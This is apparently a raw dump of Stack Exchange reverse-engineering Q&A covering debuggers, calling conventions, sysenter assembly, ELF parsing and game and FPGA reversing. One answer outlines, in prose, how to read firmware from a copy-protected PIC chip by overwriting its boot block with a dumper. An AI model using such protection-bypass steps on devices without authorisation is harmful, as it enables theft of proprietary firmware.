","<p>It depends on what your budget is like. The best USB analyzers are hardware devices with good protocol dissectors. If you have a huge budget you can go with the various solutions from LeCroy such as the <a href=""http://teledynelecroy.com/protocolanalyzer/protocoloverview.aspx?seriesid=164&amp;capid=103&amp;mid=511"">LeCroy Voyager M3i</a>. If you have a decent size budget and you only need USB 2.0, I would go for the <a href=""http://www.ellisys.com/products/usbex200/index.php"">Ellisys USB Explorer 200</a>. If you want to replay and change packets you can take a look at the <a href=""http://www.ellisys.com/products/usbex260/"">Ellisys USB Explorer 260</a> as I don't think the 200 is capable of replay. If you need USB 3.0 I would go with the <a href=""http://www.ellisys.com/products/usbex280/index.php"">Ellisys USB Explorer 280</a>. On the budget hardware side you have the <a href=""http://www.totalphase.com/products/beagle/usb480/"">Beagle 480</a> and even more budget the <a href=""http://www.totalphase.com/products/beagle_usb12/"">Beagle 12</a>.</p>

<p>If you're on a budget you can go with a software solution such as <a href=""http://www.everstrike.com/usb-monitor/"">USBSpy</a>, <a href=""http://www.usblyzer.com/"">USBLyzer</a>, <a href=""http://www.bustrace.com/"">BusTrace</a> or <a href=""http://sourceforge.net/projects/usbsnoop/"">USBSnoop</a>. </p>

<p>There's also the more DIY solution which involves running the process you want to monitor in a virtual machine such as VirtualBox and then routing the traffic which goes through the USB ports to your own dissector. You can use <a href=""http://wiki.wireshark.org/CaptureSetup/USB"">Wireshark as a dissector</a> for VM USB traffic.</p>

<p>Personally I would go with the Ellisys Explorer 200 or 260. Either one presents a good compromise between price and quality depending on your needs.</p>
","1787"
"WinDbg fails to connect to IDA Pro debugger server","5106","","<p>Environment:</p>

<ul>
<li>Host: Win7 SP1 x64: VMWare Workstation 9.02, VirtualKD, IDA Pro 6.4.13 (x64) and WinDbg</li>
<li>Guest: Win7 SP1 x64</li>
</ul>

<p>I have VirtualKD setup correctly in my guest and host.
I say this because attaching WinDbg to the guest VM through VirtualKD works flawlessly.</p>

<p>But when I try to connect IDA Pro's WinDbg interface using instruction on <a href=""http://www.hexblog.com/?p=123"" rel=""nofollow noreferrer"">this page</a>, IDA keeps throwing the following error:</p>

<pre><code>Windbg: using debugging tools from '&lt;PATH&gt;'
Connecting to debugger server with 'com:port=\\.\pipe\kd_Win7x64_SP1,pipe'
Connect failed: The server is currently disabled.
</code></pre>

<p>VirtualKD's <code>vmmon</code> is running on the host and shows the following:<img src=""https://i.stack.imgur.com/SFqc3.png"" alt=""vmmon UI""></p>

<p><strong>UPDATE:</strong> Turns out, It's a problem with IDA 6.4. I happened to have IDA 6.3 installed on my machine too. That worked with no issues.
Has anyone used IDA6.4 for live kernel debugging?
Can someone please tell me how I can correct this issue <em>in IDA 6.4</em>?</p>
","<p>I had the same problem at first when trying to connect <code>IDAPro</code> to <code>windbg</code>. What I did was the following:</p>

<ol>
<li>Manually edit the <code>ida.cfg</code> file located inside <code>.\IDA 6.4\cfg\ directory</code>.</li>
<li><p>Change the <code>DBGTOOLS</code> path with WinDbg tools directory. For example, to:</p>

<pre><code>DBGTOOLS = ""C:\\Program Files (x86)\\Windows Kits\\8.0\\Debuggers\\x86\\"";
</code></pre></li>
</ol>
","2447"
"Setting breakpoint on Win32 API does not work in Ollydbg","5045","","<p>I attached Ollydbg to a process, and try to set breakpoint on <code>CreateWindowExW</code>. I typed</p>

<pre><code>bpx CreateWindowExW
</code></pre>

<p>in command line. Then I checked the Breakpoints window and found it's totally empty.</p>

<p>The same thing works smoothly in IDA pro -- I attached IDA pro to the process I'm going to debug, then in ""Modules"" window, I choose <code>user32.dll</code> and right click on <code>CreateWindowExW</code> and choose ""Add breakpoint"".</p>

<p>Actually, I found setting breakpoint on Win32 API in Ollydbg is very very hard to use. Based on all information I got by Google, I only need to run <code>bpx xxxxx</code> to set this kind of breakpoints, but in fact, it's rarely success. Most of time, no breakpoints were set by this.</p>

<p>Did I miss something?</p>

<p>BTW: The process I debugged loaded a lot of DLLs dynamically. Is this the problem?</p>
","<p>With input focus on the disassembly pane in the CPU window, press <kbd>Ctrl</kbd>+<kbd>G</kbd>, then type <code>CreateWindowExW</code> to navigate to the first instruction of that function. Then press <kbd>F2</kbd> to set a breakpoint on the first instruction of that function.</p>

<p>This is all documented very clearly in OllyDbg's help file.</p>
","3306"
"Reverse engineering a whole website","5016","","<p>How do i reverse engineer every single aspect and functionality of a website so that i get an exact fully working copy of it?. All interactions including JavaScript, cascade style sheets, PHP to make a perfect clone of it?</p>
","<p>You can get pretty close, but if the site uses PHP, ASP.NET, or some other form of server-side html rendering, you'll never be able to completely reproduce a copy of it. This is because that server-side rendering code is just that, only on the server, and it is never sent down to the browser. </p>

<p>But if you want to ignore all that, you can certainly assume the html that comes back is static and work from there. The first request made to a website (once all redirects are done) is always a single response containing an html page. The browser then renders this html onto the window. It will download and run any scripts (js) when it hits a script tag. The scripts are run in-place, even if the whole html page hasn't been rendered yet. This is why web frameworks like Angular or React will recommend putting the script tags after the main content container has been rendered. The process is similar for style sheets. Each style tag will download a style sheet and compile it. </p>

<p>The great thing is that all this is laid out in order in the network tab of your browser's developer tools. You can view each http request made to the website's server, including the latency, full request contents, and full response contents, and a bunch of other helpful information. I'm not sure how it works for Firefox or other browsers, but if you're on Chrome you can open the developer tools by hitting F12 on Windows or Alt+Shift+I on Mac. There's a bunch of other really cool stuff you can see as well. </p>
","13255"
"Which calling convention to use for EAX/EDX in IDA","4960","","<p>I have some code (I assume Delphi) which uses only the EAX and EDX register for passing the arguments (and of course the stack if more are required). I looked which calling conventions would match, but I haven't found one which uses only EAX and EDX. 
AFAIK Borland fastcall/register is using EAX and EDX, but also ECX, which is not the case here.</p>

<p>Can I tell IDA somehow about this calling convention? How would I do this?</p>
","<p>you can add a function type by editing it (Key Y) and adding the name.</p>

<p>I wrote a <a href=""http://code.google.com/p/corkami/wiki/CallingConventions"" rel=""nofollow noreferrer"">page</a> to remind me about calling conventions at ASM level.</p>

<h2>Introduction</h2>

<p>the original call is <code>myfunc(0,1,2,3,4)</code>.</p>

<ul>
<li>standard order is first argument is pushed last.</li>
<li>standard stack adjusting is '<em>callee cleanup</em>' - after returning, the stack should be without its calling arguments. </li>
</ul>

<p><strong>Note</strong>: the stack looks vertically like the call order.</p>

<h2>stdcall (stack only)</h2>

<pre><code>push    4
push    3
push    2
push    1
push    0
call    myfunc
xor     eax,eax
retn    10
</code></pre>

<h2>Fastcall (ecx, edx)</h2>

<p>This is actually Microsoft's fastcall.</p>

<pre><code>push    4
push    3
push    2
mov     edx,1
xor     ecx,ecx
call    myfunc
xor     eax,eax
retn    10
</code></pre>

<h2>CDECL &amp; syscall (caller cleanup)</h2>

<pre><code>push    4
push    3
push    2
push    1
push    0
call    myfunc
add     esp,014
xor     eax,eax
retn    10
</code></pre>

<h2>Pascal (reverse order, ebx saved, even if ebx is unused...)</h2>

<pre><code>push    ebx
push    0
push    1
push    2
push    3
push    4
call    myfunc
xor     eax,eax
pop     ebx
retn    10
</code></pre>

<h2>Fortran/watcall (eax, edx, ebx, ecx, then stack - ebx is saved)</h2>

<p>Apparently it's not so clear what the fortran calling convention is, and this one is even different from raymond's post's The <code>__fortran</code> calling convention isn't the calling convention used by FORTRAN.</p>

<pre><code>push    ebx
push    4
mov     ecx,3
mov     ebx,2
mov     edx,1
xor     eax,eax
call    myfunc
xor     eax,eax
pop     ebx
retn    10
</code></pre>

<h2>Delphi 'registers' calling convention (default)</h2>

<p>Uses <code>eax</code>, <code>ecx</code>, <code>edx</code> as first 3 arguments. Other arguments are pushed on stack in reverse order.</p>

<pre><code>push    3
push    4
mov     ecx, 2
mov     edx, 1
xor     eax,eax
call    myfunc
xor     eax,eax
retn    10
</code></pre>
","2965"
"Get code from protected PIC","4923","","<p>I have a <a href=""http://ww1.microchip.com/downloads/en/devicedoc/39632c.pdf"">PIC18F4550</a> from an old device and I need to see the code. I tried reading it using my ICD3 programmer, but the chip seems to have its code protected. How can I get the code anyway?</p>
","<p>In the paper <a href=""http://www.openpcd.org/images/HID-iCLASS-security.pdf"">Heart of Darkness - exploring the uncharted backwaters of HID iCLASS TM security
</a> is a technique described (section III.C) that might work,but it does require a working device which might not be at hand in your situation.</p>

<p>In short they use a TTL-232 cable in synchronous bit bang mode to emulate the PIC programmer. They then override the boot block by a special dumper firmware. Why it seems to work:</p>

<blockquote>
  <p>Microchip PIC microcontrollers internal memory is an EEPROM which means that data are stored and erase by pages (which hold a predefined amount of data).
  The ""key"" point is that , whenever memory is copy protected, individual blocks can be erased resetting the copy protection bits only for these blocks.</p>
</blockquote>
","132"
"Which python library for parsing Linux ELF files?","4922","","<p>I want to be able to parse 32 and 64 bit ELF files - but not create or modify them (e.g. as discussed in <a href=""https://reverseengineering.stackexchange.com/questions/1843/what-are-the-available-libraries-to-statically-modify-elf-executables"">this thread</a>). The ELF binaries may possibly come from embedded Linux systems, that is, the library should not be irritated by MIPS, ARM and other non-x86 architectures.</p>

<p>What I have considered: </p>

<ul>
<li><a href=""https://github.com/eliben/pyelftools"" rel=""nofollow noreferrer"">pyelftools</a> (my currently favored option)</li>
<li><a href=""https://github.com/crackinglandia/pylibelf"" rel=""nofollow noreferrer"">pylibelf</a></li>
<li><a href=""https://code.google.com/p/pydevtools/"" rel=""nofollow noreferrer"">pydevtools</a></li>
<li>Also an option: using a C library and ctypes.</li>
</ul>

<p>Do I have forgotten something?
Which of the above options would you prefer? </p>

<p>For those who had some practical experience with pylibelf or pydeftools: These seem no longer updated (last commit: 2013 and 2012), are they mature enough?</p>
","<p>Take a look at radare2. It can parse file formats (see <a href=""http://radare.today/parsing-a-fileformat-with-radare2/"" rel=""nofollow"">here</a> for an example of parsing the ELF header).</p>

<p>Radare2 supports multiple architectures and is being actively developed. On top of that it has bindings for a lot of languages, including Python of course. Read through the <a href=""https://github.com/radare/radare2-bindings"" rel=""nofollow"">bindings source code</a> to see it is pretty straightforward to script it.</p>

<p>HTH!</p>
","8825"
"DLL - Dynamic Analysis on IDA","4914","","<p>I'm ""middle-new"" in re and I have to debug a dll's function. How can I tell to IDA : start function XXX with parameters A, B and C ?
Is there a solution or a plugin doing that ? I've tried doing that with rundll32.exe but unsucessfully.</p>

<p>I have no experience on ollydbg this is why I ask for a IDA solution</p>

<p>Thanks for helping !</p>
","<p>Based on <a href=""https://stackoverflow.com/questions/3207365/how-to-use-rundll32-to-execute-dll-function"">this answer</a>, rundll only supports running functions with a specific signature. I would recommend writing a simple executable that loads it. For example, in c, you could call <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms684175%28v=vs.85%29.aspx"" rel=""nofollow noreferrer"">LoadLibrary</a>(""yourdll.dll"") and then <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms683212%28v=vs.85%29.aspx"" rel=""nofollow noreferrer"">GetProcAddress</a>(""yourfunc"") and then call it that way. See MSDN (linked) for more info.</p>

<p>In IDA, you would then give your executable as the process, but your dll as the input file. That will allow you to set breakpoints that IDA will set when the dll is loaded. It also gives you control over the parameters since you can just pass them through from the command line.</p>
","4272"
"Catch MessageBox call with OllyDbg","4840","","<p>I am trying to learn to get around Ollydbg, using Lena's tutorial. The latter is based on v.1.10 but I'm using 2.01. So far that went ok. </p>

<p>However, I now find myself in a situation where my result differs a lot from the tutorial (no 4). </p>

<p>I'm trying to catch the call for a messagebox in the code. The tutorial describes I should, with the messagebox open, pause Ollydbg, then return to the application and close the messagebox. This would make Ollydbg break after I clicked the box away and I would land right after the messagebox call in the code. </p>

<p>In my case though, as soon as I click pause, Olly leaves the main application module, landing on RETN in a subroutine of USER32.GetMessageA</p>

<p>Now I can't get back to the application at all, it's blocked. I have to continue the debugger in order to be able to get back to it again but this way I get no info about the messagebox. </p>

<p>Any tips how to proceed in order to get the expected result? I guess in this specific example I could just search for all messagebox calls in the code but that's hardly a good way, especially with large apps. </p>

<p>A related question, is there a possibility to ""look back"" on what happened, as in which code was called up to a certain moment? </p>

<p>Apologies if any of this doesn't make much sense. </p>
","<p><kbd>alt + k</kbd> to view or look back </p>

<p>here is a <kbd>f9</kbd>-> <kbd>f12</kbd> -> <kbd>alk + k</kbd> output on a simple message box</p>

<pre><code>Call stack of main thread
Stack     Data      Procedure                                     Called from                  Frame
0013FA78  7E419418   ???                                          USER32.WaitMessage+0A
0013FAB0  7E4249C4  /USER32.DialogBox2                            USER32.InternalDialogBox+0B1
0013FAB4  00A20142  |  Arg1 = 0A20142
0013FAB8  00000000  |  Arg2 = 0
0013FABC  00000001  |  Arg3 = 1
0013FAC0  00000000  \  Arg4 = 0
0013FAD8  7E43A956  /USER32.InternalDialogBox                     USER32.SoftModalMessageBox+6&gt;
0013FADC  7E410000  |  Arg1 = USER32.&lt;STRUCT IMAGE_DOS_HEADER&gt;
0013FAE0  00152F38  |  Arg2 = 152F38
0013FAE4  00000000  |  Arg3 = 0
0013FAE8  7E43A016  |  Arg4 = USER32.MB_DlgProc
0013FAEC  0013FEF0  |  Arg5 = 13FEF0
0013FAF0  00000000  \  Arg6 = 0
0013FD98  7E43A2BC  /USER32.SoftModalMessageBox                   USER32.MessageBoxWorker+170
0013FD9C  0013FEF0  \  Arg1 = 13FEF0
0013FEE8  7E4663FD  /USER32.MessageBoxWorker                      USER32.MessageBoxTimeoutW+75
0013FEEC  0013FEF0  \  Arg1 = 13FEF0
0013FF40  7E4664A2  /USER32.MessageBoxTimeoutW                    USER32.MessageBoxTimeoutA+97
0013FF44  00000000  |  Arg1 = 0
0013FF48  001529C8  |  Arg2 = UNICODE ""Multi-line text for a simp&gt;
0013FF4C  00152AB0  |  Arg3 = UNICODE ""Caption For A Simple And P&gt;
0013FF50  00000000  |  Arg4 = 0
0013FF54  00000000  |  Arg5 = 0
0013FF58  FFFFFFFF  \  Arg6 = -1
0013FF74  7E450877  /USER32.MessageBoxTimeoutA                    USER32.MessageBoxExA+16
0013FF78  00000000  |  Arg1 = 0
0013FF7C  00401008  |  Arg2 = ASCII ""Multi-line text for a simple&gt;
0013FF80  00401070  |  Arg3 = ASCII ""Caption For A Simple And Pla&gt;
0013FF84  00000000  |  Arg4 = 0
0013FF88  00000000  |  Arg5 = 0
0013FF8C  FFFFFFFF  \  Arg6 = -1
0013FF94  7E45082F  /USER32.MessageBoxExA                         USER32.MessageBoxA+40
0013FF98  00000000  |  hOwner = NULL
0013FF9C  00401008  |  Text = ""Multi-line text for a simple and p&gt;
0013FFA0  00401070  |  Caption = ""Caption For A Simple And Plain &gt;
0013FFA4  00000000  |  Type = MB_OK|MB_DEFBUTTON1|MB_APPLMODAL
0013FFA8  00000000  \  LanguageID = LANG_NEUTRAL
0013FFB0  004010AE  /USER32.MessageBoxA                           msgbox.004010A8
0013FFB4  00000000  |  hOwner = NULL
0013FFB8  00401008  |  Text = ""Multi-line text for a simple and p&gt;
0013FFBC  00401070  |  Caption = ""Caption For A Simple And Plain &gt;
0013FFC0  00000000  \  Type = MB_OK|MB_DEFBUTTON1|MB_APPLMODAL
</code></pre>

<p>no you cant close a paused MessageBox not in v 1.10 or not in v 2.01<br>
it is simply not possible period<br>
you must be misreading or misunderstanding the tutorial</p>

<p>you need to set a breakpoint some where on any of the return address and continue execution 
or you can select a return address in call stack and hit <kbd>f4</kbd> to execute until return</p>

<p><a href=""https://i.stack.imgur.com/jvX9Z.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/jvX9Z.png"" alt=""enter image description here""></a></p>
","11262"
"IDA Pro function stack frame view","4810","","<p>IDA Pro displays certain buffer or padding above (at lower addresses) local variables in stack frame view. For instance:</p>

<p><strong>Example 1.</strong><br> 
The following screen shot of stack frame view shows 12 bytes (included in the red box) buffer: </p>

<p><img src=""https://i.stack.imgur.com/wB1ok.png"" alt=""enter image description here""></p>

<p><strong>Example 2.</strong><br> 
The following screen shot of a different stack frame view shows 12 bytes buffer again:</p>

<p><img src=""https://i.stack.imgur.com/ForTX.png"" alt=""enter image description here""></p>

<p>I understand that IDA marked it as <strong><code>db ?; undefined</code></strong> because it couldn't figure out how it was used. I also realize that IDA automatically calculates size of a stack frame by monitoring ESP. I would assume it might have something to do with non-volitile register save area. However, in <strong>Example 1</strong> it clearly shows <strong><code>Saved regs: 0</code></strong> and in <strong>Example 2</strong> it shows <strong><code>Saved regs: 4</code></strong>. I am puzzled, and here go my questions:</p>

<p>Why does IDA Pro display certain buffer or padding above (at lower addresses) local variables in stack frame view? Is it a coincidence that both views show exactly <strong>12 bytes</strong> buffer? Is it something particular to certain calling convention or complier? </p>
","<p>Thank you all so much for your answers and comments. While reading your comments and preparing to update my question, I found the answer. </p>

<p>I must give credit to <a href=""https://reverseengineering.stackexchange.com/users/60/igor-skochinsky"">Igor Skochinsky</a>, who asked me to provide functions' prolog instructions. Both functions use the <a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#cdecl"" rel=""nofollow noreferrer"">cdecl calling convention</a>. However, calling convention has nothing to do with this buffer. This is what the prolog looks like:</p>

<pre><code>push    ebp
mov     ebp, esp
sub     esp, &lt;size of local vars&gt;
push    ebx
push    esi
push    edi
</code></pre>

<p>This buffer reflects <strong>three push instructions</strong> for registers EBX, ESI, EDI. These registers are categorized as <strong>Callee Saved Registers</strong> and this ""buffer"" is called <strong>Non-Volatile Register Save Area</strong>. </p>

<p>In accordance to x86 convention (it is also applicable to x64), registers are divided into <strong>Caller Saved Registers</strong> and <strong>Callee Saved Registers</strong>. </p>

<p>Caller saved registers are also known as volatile registers. Those are core CPU registers such as EAX, EDX, and ECX. A calling function (Caller) is responsible for saving volatile registers onto usually runtime stack before making a call. </p>

<p>Callee saved registers are known as non-volatile registers. Those are core CPU registers such as EBX, ESI, EDI, ESP, and EBP. It is assumed by convention, that values in those registers will be preserved by a callee function. In case any of the non-volatile registers are going to be used within a callee,  the callee is responsible to save the registers onto runtime stack. In addition, the callee is responsible to restore those registers before returning to a caller function.</p>

<p>The way volatile and non-volatile registers used is rather compiler driven. The following paper <a href=""http://www.cs.virginia.edu/~evans/cs216/guides/x86.html"" rel=""nofollow noreferrer""><strong>x86 Assembly Guide</strong></a> describes Caller and Callee rules in more detail. </p>
","2295"
"Reverse Engineering of data structures in games","4785","","<p>I am currently participating in a reverse code engineering seminar for my studies in informatics: games engineering and was assigned the topic about ""Identifying data structures"". After an extensive talk with my supervisor we both came to the conclusion that it would make sense that i combine the topic with reversing game binaries.
Our deliverables are a 15 page paper and a small tool implementing the techniques we talk about in the paper. We do not necessarily need to invent a new technique. </p>

<p>I already did some research about reverse engineering data structures in general and came up with mostly tools that automatically reverse engineer data structures from binary execution (e.g. <a href=""https://www.utdallas.edu/~zxl111930/file/Rewards_NDSS10.pdf"">https://www.utdallas.edu/~zxl111930/file/Rewards_NDSS10.pdf</a>)</p>

<p>Now my question is: What would be a reasonable tool to program or a technique to write about in relation to reversing data structures from video game binaries (like World of Warcraft)? Is the method mentioned in the paper above still applicable to game binaries or are there any other known techniques?</p>

<p>I do have some experience when it comes to reverse engineering, but i am no where near ""pro""-level. I am mostly working on a Windows (x64) platform.</p>
","<p>Side Note: WoW, or any comparable MMORPG, is probably a bad target for your research, because many of those feature various anti-hack, anti-cheat or anti-botting techniques, which will probably detect what you're doing.</p>

<p>I'm far from being an expert on this myself, but i've disassembled and tried to understand a 20 year old game as a hobby project recently. The executable has a size of 800 KB, IDA detected about 1750 functions in it, 250 of which were C/C++ library functions. Needless to say, i spent quite some time looking at various functions and checking the strings they used without understanding too much.</p>

<p>What brought the breakthrough for me was when i found out how the compiler handled class construction; each class constructor calls a <code>malloc()</code>-like function (with the size as parameter), then calls the constructor of the superclass, then initializes the methods (there is no vtable like in more modern compilers; the compiler initializes every ""function pointer"" individually) and class variables. Cross-referencing those <code>malloc()</code> calls, checking the sizes of the classes allocated, and following the chains of ""constructor calls superclass constructor"" immediately gave me an idea of the whole class tree and the size of each class.</p>

<p>Also, i got an idea of which function was a subclass method of which other function in the main class, which brought a lot of insight into the purpose of those functions, as as i knew which function was a class method of which class, it was quite easy to track the <code>this</code> pointer of the function, track its dereferences, and find out which class element was used as integer, double, or pointer type, and in case of pointers, know which other class type they pointed to.</p>

<p>This was my first exposure to IDA, so i knew nothing about its scripting capabilities and started learning about them when things became too repetitive; if i had to do the same now, i'd probably script/automate a lot of what i did manually.</p>

<p>I think this might even be easier with modern C++ compilers that use vtables in a predictible way; check where the vtables get assigned to find out where classes get instantiated; check the superclass-constructor calls to find out about class hierarchy; check the sizes in <code>malloc</code>/<code>new</code> calls to get structure/class sizes; track the <code>this</code> pointers in class methods (which are easily identified through the vtables) to find out how the elements are used. All this can be done using static analysis, so you don't even have to care much about how anti-cheat/anti-debug techniques might affect the outcome.</p>
","6507"
"Paste hex bytes into IDA Pro Hex View","4770","","<p>Is it possible to paste a series of bytes into hex view of IDA? Say I have a large buffer I need to fill with a specific value, and I have it in the form most hex editors output... 0A AB EF FF 00 01... is there some quick way to write this value to a segment of the hex view? Or do this through IDAPython?</p>

<p><strong>Edit:</strong></p>

<p>Solved using PatchByte as suggested below:</p>

<pre><code>def PatchArr(dest, str):
  for i, c in enumerate(str):
    idc.PatchByte(dest+i, ord(c));

# usage: patchArr(start address, string of bytes to write)
patchArr(0xCAFEBABE, ""\x01\x02\x03"")
</code></pre>

<p>Note that I am not a fan of edits to volatile debug memory causing IDA to complain about the IDB being patched post-debug...</p>
","<p>While in IDA's Hex View you can go to <strong>Edit->Patch Program->Change Byte</strong>, but I think this only lets you patch 16 bytes at a time. If you need to patch more bytes than that you can use IDAPython's <strong>idc.PatchByte</strong> / <strong>idc.PatchWord</strong> / <strong>idc.PatchDword</strong> to change bytes in the IDA database.</p>

<p>EDIT:</p>

<p>Just a quick note, if you want your patches applied to the original file that you loaded into IDA, you need to go to <strong>Edit->Patch Program->Apply patches to input file</strong> after you patch the bytes in the idb.</p>
","2944"
"How to use sysenter under Linux?","4765","","<p>I would like to know what are the different ways to perform a system
call in x86 assembler under Linux. But, with no cheating, only
assembler must be used (i.e. compilation with <code>gcc</code> must be done with
<code>-nostdlib</code>).</p>

<p>I know four ways to perform a system calls, namely:</p>

<ul>
<li><code>int $0x80</code></li>
<li><code>sysenter</code> (i586)</li>
<li><code>call *%gs:0x10</code> (vdso trampoline)</li>
<li><code>syscall</code> (amd64)</li>
</ul>

<p>I am pretty good at using <code>int $0x80</code>, for example, here is a sample
code of a classic 'Hello World!' in assembler using <code>int $0x80</code> (compile it with <code>gcc -nostdlib -o hello-int80 hello-int80.s</code>):</p>

<pre><code>.data
msg:
  .ascii ""Hello World!\n""
  len = . - msg

.text
.globl _start

_start:
# Write the string to stdout
  movl  $len, %edx
  movl  $msg, %ecx
  movl  $1, %ebx
  movl  $4, %eax
  int   $0x80

# and exit
  movl  $0, %ebx
  movl  $1, %eax
  int   $0x80
</code></pre>

<p>But the <code>sysenter</code> is often ending with a segmentation fault error. Why ? And, how to use it right ?</p>

<p>Here is an example with <code>call *%gs:0x10</code> (compiled with <code>gcc -o hello-gs10 hello-gs10.s</code>). Note that I need to go through the <code>libc</code> initialization before calling it properly (that is why I am using <code>main</code> and not anymore <code>_start</code> and, that is also why I removed the option <code>-nostdlib</code> from the compile line):</p>

<pre><code>.data
msg:
  .ascii ""Hello World!\n""
  len = . - msg

.text
.globl main

main:
# Write the string to stdout
  movl  $len, %edx
  movl  $msg, %ecx
  movl  $1, %ebx
  movl  $4, %eax
  call  *%gs:0x10

# and exit
  movl  $0, %ebx
  movl  $1, %eax
  call  *%gs:0x10
</code></pre>

<p>Also, the <code>syscall</code> is working pretty well also if you know the <a href=""http://lxr.linux.no/#linux+v2.6.32/arch/x86/include/asm/unistd_64.h"">syscall codes for this architecture</a> (thanks to lfxgroove) (compiled with: <code>gcc -m64 -nostdlib -o hello-syscall hello-syscall.s</code>):</p>

<pre><code>.data
msg:
  .ascii ""Hello World!\n""
  len = . - msg

.text
.globl _start

_start:
# Write the string to stdout
  movq  $len, %rdx
  movq  $msg, %rsi
  movq  $1, %rdi
  movq  $1, %rax
  syscall
# and exit
  movq  $0, %rdi
  movq  $60, %rax
  syscall
</code></pre>

<p>So, the only problem I have to trigger a system call is this <code>sysenter</code> way. Here is an example with <code>sysenter</code> ending with a segmentation fault (compiled with <code>gcc -m32 -nostdlib -o hello-sysenter hello-sysenter.s</code>):</p>

<pre><code>.data
msg:
  .ascii ""Hello World!\n""
  len = . - msg

.text
.globl _start

_start:
# Write the string to stdout
  movl  $len, %edx
  movl  $msg, %ecx
  movl  $1, %ebx
  movl  $4, %eax

  push    final
  sub $12, %esp
  mov %esp, %ebp

  sysenter
# and exit
final:  
  movl  $0, %ebx
  movl  $1, %eax

  sub $12, %esp
  mov %esp, %ebp

  sysenter
</code></pre>
","<h2>System calls through <code>sysenter</code></h2>

<p><code>sysenter</code> is a i586 instruction, specifically tight to 32-bits
applications. It has been subsumed by <code>syscall</code> on 64-bits plateforms.</p>

<p>One particularity of <code>sysenter</code> is that it does require, in addition
to the usual register setting, a few manipulations on the stack before
calling it. This is because before leaving <code>sysenter</code>, the process
will go through the last part of the <code>__kernel_vsyscall</code> assembler
snippet (starting from <code>0xf7ffd430</code>):</p>

<pre><code>Dump of assembler code for function __kernel_vsyscall:
   0xf7ffd420 &lt;+0&gt;:        push   %ecx
   0xf7ffd421 &lt;+1&gt;:        push   %edx
   0xf7ffd422 &lt;+2&gt;:        push   %ebp
   0xf7ffd423 &lt;+3&gt;:        mov    %esp,%ebp
   0xf7ffd425 &lt;+5&gt;:        sysenter 
   0xf7ffd427 &lt;+7&gt;:        nop
   0xf7ffd428 &lt;+8&gt;:        nop
   0xf7ffd429 &lt;+9&gt;:        nop
   0xf7ffd42a &lt;+10&gt;:       nop
   0xf7ffd42b &lt;+11&gt;:       nop
   0xf7ffd42c &lt;+12&gt;:       nop
   0xf7ffd42d &lt;+13&gt;:       nop
   0xf7ffd42e &lt;+14&gt;:       int    $0x80
=&gt; 0xf7ffd430 &lt;+16&gt;:       pop    %ebp
   0xf7ffd431 &lt;+17&gt;:       pop    %edx
   0xf7ffd432 &lt;+18&gt;:       pop    %ecx
   0xf7ffd433 &lt;+19&gt;:       ret    
End of assembler dump.
</code></pre>

<p>So, the <code>sysenter</code> instruction expect to have the stack forged in that
way:</p>

<pre><code>0x______0c  saved_eip   (ret)
0x______08  saved_%ecx  (pop %ecx)
0x______04  saved_%edx  (pop %edx)
0x______00  saved_%ebp  (pop %ebp)
</code></pre>

<p>That's why, each time we need to call <code>sysenter</code>, we first have to
push the values of the saved <code>%eip</code>, and the same with<code>%ecx</code>, <code>%edx</code>
and <code>%ebp</code>. Which leads to:</p>

<pre><code>.data
msg:
    .ascii ""Hello World!\n""
    len = . - msg

.text
.globl _start
_start:
    pushl  %ebp
    movl   %esp, %ebp
# Write the string to stdout
    movl   $len, %edx
    movl   $msg, %ecx
    movl   $1, %ebx
    movl   $4, %eax
# Setting the stack for the systenter
    pushl  $sysenter_ret
    pushl  %ecx
    pushl  %edx
    pushl  %ebp
    movl   %esp,%ebp
    sysenter
# and exit
sysenter_ret:    
    movl   $0, %ebx
    movl   $1, %eax
# Setting the stack for the systenter
    pushl  $sysenter_ret # Who cares, this is an exit !
    pushl  %ecx
    pushl  %edx
    pushl  %ebp
    movl   %esp,%ebp
    sysenter
</code></pre>
","2894"
"What tools exist for excavating data structures from flat binary files?","4695","","<h1>Problem Statement</h1>

<p>I have a file composed entirely of data structures; I've been trying to find a tool that will enable me to open this file, and declare (perhaps) a type and offset such that i may work with the presumed primitive data type individually.</p>

<p>e.g. I declare the 4 bytes located at offset 0x04 to be a 32-bit unsigned integer, and would like to inspect the value at this location (read as big-endian perhaps) and then work with this integer individually (perhaps see what it looks like encoded as a 4-byte ascii string and attempt to read it, etc.)</p>

<h1>Specifics</h1>

<p>I have a 4096 byte file containing C-structs with member elements as integers ranging from 16-64 bits in length; the following is an example:</p>

<pre><code>struct my_struct {
uint_32 magic
} // sizeof(my_struct) == 0x04
</code></pre>

<p>In this case, magic = 'ball', and so when the file is opened in a text editor it reads as 'llab...', and obviously can also be represented as a 32-bit integer</p>

<h1>Question</h1>

<p>Is there a tool that enables static analysis of flat data structure files?</p>

<h1>What I've considered thus far as a solution</h1>

<p>I've considered writing a command line tool in Python to do this, but if something already exists I'd prefer to save time, and perhaps learn more about this topic by using a tool designed by someone more experienced. If it seems to you that I am going about this incorrectly (this is my first serious exploration into this kind of reversing) please guide my understanding, thanks.</p>

<h1>Where I have already researched</h1>

<p>Googled 'reverse engineering tools' and browsed the links</p>

<p>Checked wikipedia's reverse engineering pages</p>

<p>Tried some first principles reasoning</p>

<p>Checked pypi</p>

<h1>Results</h1>

<p>There are three completely valid and correct answers, but I've marked the most detailed and least expensive of them as correct, because it is the most accessible to members of the community reviewing this question.</p>
","<p><a href=""http://www.sweetscape.com/010editor/templates.html"" rel=""noreferrer"">010 Editor's Binary Templates</a> feature is ideal for this type of work. It not only supports static <code>struct</code> definitions, but also allows for dynamically sized <code>struct</code> fields and supports a powerful scripting language.</p>

<p><img src=""https://i.stack.imgur.com/BeE2h.gif"" alt=""Example Template""></p>

<p><img src=""https://i.stack.imgur.com/0Vq3a.gif"" alt=""Editing the Template Results""></p>
","3499"
"Reversing an FPGA circuit","4650","","<p>Let's assume I have a device with an FPGA on it, and I managed to extract the bitstream from its flash. How would I go about recovering its behavior?</p>

<p>One simple case is if it implements a soft processor - in that case there should be firmware for that processor somewhere and I can just disassemble that. But what if it's just a bunch of IP blocks and some additional logic?</p>
","<p>While FPGA makers don't just throw their formats out there, there is extensive documentation at a low level. Xilinx devices are a good example. </p>

<p>To reverse engineer the bit stream you might generate test cases that implement simple logic and see how those translate to the bit stream, then move on to designs that exercise different portions of the chip. </p>

